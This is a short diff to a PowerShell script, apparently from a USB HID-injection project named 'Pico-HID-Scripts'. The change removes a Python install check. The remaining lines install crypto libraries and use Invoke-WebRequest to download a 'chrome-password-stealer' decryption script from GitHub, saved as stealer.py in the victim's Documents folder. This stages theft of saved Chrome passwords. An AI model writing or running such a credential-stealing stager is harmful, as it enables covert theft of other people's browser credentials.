@@ -4,16 +4,6 @@ param (
 
 $filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
 
-if (Test-Path -Path $filePath -PathType Leaf) {
-
-    Write-Host "Python is already installed"
-
-} else {
-
-    Write-Host "Python does not exist"
-    winget install python3 --force -h --accept-source-agreements
-}
-
 py -m pip install pycryptodomex pywin32
 
 Invoke-WebRequest -Uri https://github.com/simen64/Pico-HID-Scripts/blob/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
